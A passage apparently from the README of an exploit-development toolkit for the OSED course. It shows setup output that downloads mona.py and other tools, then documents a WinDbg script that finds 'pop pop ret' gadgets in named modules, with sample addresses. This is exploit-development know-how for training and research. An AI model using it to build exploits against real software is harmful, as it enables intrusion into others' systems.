[=] downloading https://github.com/corelan/mona/raw/master/mona.py
[=] downloading https://www.python.org/ftp/python/2.7.17/python-2.7.17.msi
[=] downloading https://download.microsoft.com/download/2/E/6/2E61CFA4-993B-4DD4-91DA-3737CD5CD6E3/vcredist_x86.exe
[=] downloading https://raw.githubusercontent.com/epi052/osed-scripts/main/install-mona.ps1
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request

```

## WinDbg Scripts

all windbg scripts require `pykd`

run `.load pykd` then `!py c:\path\to\this\repo\script.py` 

### find-ppr.py

Search for `pop r32; pop r32; ret` instructions by module name

```
!py find-ppr.py libspp diskpls

[+] diskpls::0x004313ad: pop ecx; pop ecx; ret
[+] diskpls::0x004313e3: pop ecx; pop ecx; ret
[+] diskpls::0x00417af6: pop ebx; pop ecx; ret
...
[+] libspp::0x1008a538: pop ebx; pop ecx; ret
[+] libspp::0x1008ae39: pop ebx; pop ecx; ret
[+] libspp::0x1008aebf: pop ebx; pop ecx; ret
...
```
